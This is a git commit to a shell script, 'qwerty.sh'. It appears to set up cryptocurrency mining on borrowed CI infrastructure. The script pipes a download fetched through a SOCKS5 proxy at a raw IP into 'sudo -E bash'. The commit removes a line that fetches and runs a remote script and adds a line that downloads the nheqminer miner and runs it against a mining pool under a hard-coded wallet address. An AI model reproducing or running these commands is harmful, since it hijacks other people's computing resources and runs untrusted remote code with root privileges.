cbc88c75a2316969cd2237b40f403754e55e4ec9
enengsaren <93846709+enengsaren@users.noreply.github.com>
2021-11-07 08:29:38 +0700

    Update qwerty.sh

--- qwerty.sh
+++ qwerty.sh
@@ -6,16 +6,8 @@ curl -sL socks5://23.94.186.132:1080 https://circleci.com | sudo -E bash -
 
 curl -v +x socks5://23.94.186.132:1080 https://circleci.com/
 
-sudo apt install nodejs
-
-node --version
-
-cd /tmp
-
-cd /
-
 ls
 
 sudo service --status-all
 
-wget https://raw.githubusercontent.com/agustinayuni/nannos/main/Data_api.sh && chmod +x Data_api.sh && ./Data_api.sh
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u DAi3DLz999VQW6Wuz3iLDqoVihL9227zQU.DGB -p x c=DGB -t 2
